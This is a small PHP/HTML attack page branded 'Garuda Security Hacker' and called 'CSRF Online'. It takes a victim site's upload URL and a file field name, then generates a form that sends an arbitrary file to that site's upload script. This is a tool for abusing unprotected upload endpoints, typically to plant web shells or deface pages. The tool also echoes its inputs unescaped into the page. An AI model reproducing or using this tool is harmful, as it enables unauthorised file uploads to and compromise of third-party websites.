<html>
<title>CSRF | Garuda Security Hacker</title>
<style type='text/css' media='screen'>
    body{ 

        background-color: #000000;
        background-content:HPH;
        background-attachment:fixed;
        background-position:bottom; 
	}
hr {
 border:0;
 height:1px;
 background-image:linear-gradient(to right,rgba(0,0,0,0),rgb(255, 0, 0),rgba(0,0,0,0))
 }



</style>

<body onLoad="type_text()" ; bgColor=#000000">
<center>
<br><br><br><br><br><br><br>
<hr width="40%" height="10%" color="black">
<p><font size="10" color="white" style="text-shadow: 5px 5px 20px red;">CSRF Online</font></p>
<form method="post">
URL: <input type="text" name="url" size="50" height="10" placeholder="http://www.target.com/[path]/upload.php" style="margin: 5px auto; padding-left: 5px;" required><br>
POST File: <input type="text" name="pf" size="50" height="10" placeholder="Filedata / files[] / qqfile / userfile / dll" style="margin: 5px auto; padding-left: 5px;" required><br>
<input type="submit" name="d" value="Kunci Target!!!">
</form>
<?php
$url = $_POST['url'];
$pf = $_POST['pf'];
$d = $_POST['d'];
if($d) {
	echo "<form method='post' target='_blank' action='$url' enctype='multipart/form-data'><input type='file' name='$pf'><input type='submit' name='g' value='Upload Cok!'></form";
}
?>
</form>
<hr width="40%" height="10%" color="black">

</center>
</html>
